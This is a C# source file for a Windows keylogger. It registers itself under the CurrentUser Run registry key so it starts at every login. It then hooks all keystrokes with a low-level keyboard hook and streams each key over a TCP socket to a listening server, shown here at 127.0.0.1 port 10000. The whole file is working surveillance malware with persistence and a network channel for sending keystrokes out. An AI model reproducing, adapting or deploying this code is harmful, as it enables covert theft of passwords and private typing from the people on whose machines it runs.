﻿using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Sockets;
using System.Text;
using Server;
using System.IO;
using System.Threading.Tasks;
using System.Net;
using Microsoft.Win32;

namespace KeyLogger
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        static StreamWriter writer;



        static TcpClient tcpclient;

       

        
        

        [STAThread]
        public static void  Main() 
        {
            // Добавление в автозагрузку
            string ExePath = System.Windows.Forms.Application.ExecutablePath;
            string name = "KeyLogger";
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            reg.SetValue(name, ExePath);
            //
            //App.MainWindow.Visibility = System.Windows.Visibility.Hidden;
            
            

            tcpclient = new TcpClient(AddressFamily.InterNetwork);

            tcpclient.Connect(IPAddress.Parse("127.0.0.1"), 10000);
            writer = new StreamWriter(tcpclient.GetStream());






               




                _hookID = SetHook(_proc);




                //writer









                Application.Run();


            
            

            // Console.WriteLine(_hookID.ToString() + " " + DateTime.Now); 

            // UnhookWindowsHookEx(_hookID);
        }
        
       
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                // Console.WriteLine((Keys)vkCode + " " + DateTime.Now);


                var p = $"{Convert.ToInt32(PackageType.Send)};{(Keys)vkCode};{1}";

                writer.Write(p);
                writer.Flush();
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
